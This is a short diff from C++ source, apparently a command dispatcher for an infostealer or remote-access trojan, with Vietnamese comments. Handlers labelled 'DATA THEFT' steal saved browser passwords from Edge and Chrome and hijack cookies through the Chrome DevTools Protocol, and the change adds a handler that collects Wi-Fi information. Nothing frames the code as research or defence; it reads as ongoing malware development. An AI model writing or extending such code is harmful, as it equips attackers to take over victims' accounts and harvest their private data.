@@ -68,5 +68,7 @@ public:
         // === DATA THEFT ===
         map["steal_credentials"] = ChromeRecovery::handleStealCredentials; // Lấy Pass (Edge/Chrome cũ)
         map["steal_cookies_cdp"] = ProcessHandlers::stealCookiesCDP;       // Lấy Cookie (Brave/Chrome mới - CDP)
+
+        map["wifi_info"] = ProcessHandlers::getWifiInfo;
     }
 };
